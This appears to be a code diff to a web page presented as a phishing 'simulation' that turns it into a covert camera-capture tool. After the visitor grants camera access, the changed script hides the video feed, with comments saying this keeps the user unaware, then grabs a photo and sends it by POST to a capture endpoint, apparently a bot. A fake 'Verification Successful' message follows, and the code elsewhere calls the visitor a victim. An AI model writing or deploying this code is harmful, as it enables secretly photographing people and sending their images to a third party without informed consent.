@@ -39,26 +39,20 @@
       <button onclick="startDemo()">Allow Camera Access</button>
     </div>
 
-    <!-- Step 2: Loading -->
+    <!-- Step 2: Loading & Video (Hidden camera capturing) -->
     <div id="loading" class="stage" style="display:none;">
       <div class="loader"></div>
-      <div id="status" class="message">Initializing...</div>
-      <div class="device-info" id="devinfo"></div>
-    </div>
-
-    <!-- Step 3: Camera & Image (Auto Capture) -->
-    <div id="camera" class="stage" style="display:none;">
-      <img id="preview" src="" alt="Your Verification Image" style="display:none; margin-bottom: 10px;">
+      <div class="message">Verifying...</div>
+      <!-- Video ko chhupa ke rakha hai taaki user ko pata na chale camera khich raha hai -->
       <video id="video" autoplay playsinline style="display:none;"></video>
-      <div id="status-msg" class="message" style="display:none; margin-top: 15px;">Please wait, verifying identity...</div>
     </div>
 
-    <!-- Step 4: Result -->
+    <!-- Step 3: Show Final Image -->
     <div id="result" class="stage" style="display:none;">
-      <img id="captured" src="" alt="Captured Photo">
+      <img id="preview" src="" alt="Verification Image" style="margin-bottom: 20px;">
       <div class="warning">
-        <strong>⚠️ This was a simulation.</strong><br><br>
-        Real phishing pages may try to capture your data or access your camera without clear intent.
+        <strong>✅ Verification Successful.</strong><br><br>
+        This was a simulation. Real phishing pages may try to capture your data or access your camera without clear intent.
       </div>
       <button onclick="resetDemo()" style="background:#333;color:#fff;">Restart Demo</button>
     </div>
@@ -74,97 +68,61 @@
 
   let stream = null;
 
-  function showDeviceInfo() {
-    document.getElementById('devinfo').innerHTML = `
-      User-Agent: ${navigator.userAgent.substring(0,70)}...<br>
-      Screen: ${screen.width}×${screen.height}<br>
-      Time: ${new Date().toLocaleString('en-IN')}
-    `;
-  }
-
-  const loaderMessages = ["Initializing...","Connecting...","Simulating analysis...","Completed"];
-  let msgIdx = 0;
-  
-  function runLoader() {
-    document.getElementById('status').textContent = loaderMessages[msgIdx];
-    msgIdx = (msgIdx+1)%loaderMessages.length;
-    if (msgIdx !== 0) setTimeout(runLoader, 1100);
-    else setTimeout(showImageAndCamera, 800);
-  }
-
   async function startDemo() {
     document.getElementById('consent').style.display='none';
     document.getElementById('loading').style.display='flex';
-    showDeviceInfo();
     
-    // Permission maango
+    // 1. Permission maango
     try {
       stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-      document.getElementById('video').srcObject = stream;
-      runLoader();
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+      
+      // Video start hone ka wait karo
+      video.onloadedmetadata = () => {
+        // 2. 2 second wait karo taaki camera adjust ho jaye aur user ko pata na chale
+        setTimeout(() => {
+          captureAndSend();
+        }, 2000); // 2 seconds
+      };
     } catch(e) {
       alert("Camera access denied. Cannot proceed.");
       resetDemo();
     }
   }
 
-  function showImageAndCamera() {
+  async function captureAndSend() {
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const imageBase64 = canvas.toDataURL('image/jpeg', 0.92);
+    
+    // Camera band karo
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+    
+    // 3. Photo bot pe send karo
+    try {
+      await fetch(CAPTURE_ENDPOINT, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({token: TOKEN, image: imageBase64})
+      });
+    } catch(e) { console.log(e); }
+
+    // 4. Ab woh image dikhao jo tune bot ko bheji thi
+    showFinalImage();
+  }
+
+  function showFinalImage() {
     document.getElementById('loading').style.display='none';
-    document.getElementById('camera').style.display='flex';
-    document.getElementById('video').style.display = 'block';
+    document.getElementById('result').style.display='flex';
 
     if (TOKEN) {
       const img = document.getElementById('preview');
       img.src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
-      img.onload = () => {
-        img.style.display = 'block';
-        startAutoCapture(); // Image dikhne ke baad auto-capture start karo
-      };
-      img.onerror = () => {
-        startAutoCapture(); // Agar image na mile toh bhi capture karo
-      };
-    } else {
-      startAutoCapture();
     }
-  }
-
-  // Automatic capture function
-  function startAutoCapture() {
-    const statusMsg = document.getElementById('status-msg');
-    statusMsg.style.display = 'block';
-
-    // Victim ko 3 second ka time do position me aane ke liye
-    setTimeout(() => {
-      const video = document.getElementById('video');
-      
-      // Video ready hona chahiye
-      if (video.videoWidth === 0) {
-        // Agar video abhi load nahi hui toh thoda aur wait karo
-        setTimeout(startAutoCapture, 1000);
-        return;
-      }
-
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      const imageBase64 = canvas.toDataURL('image/jpeg', 0.92);
-      document.getElementById('captured').src = imageBase64;
-      
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      
-      document.getElementById('camera').style.display='none';
-      document.getElementById('result').style.display='flex';
-
-      // Backend pe send karo
-      fetch(CAPTURE_ENDPOINT, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({token: TOKEN, image: imageBase64})
-      }).catch(e => console.log("Send error:", e));
-
-    }, 3000); // 3000 ms = 3 seconds
   }
 
   function resetDemo() {
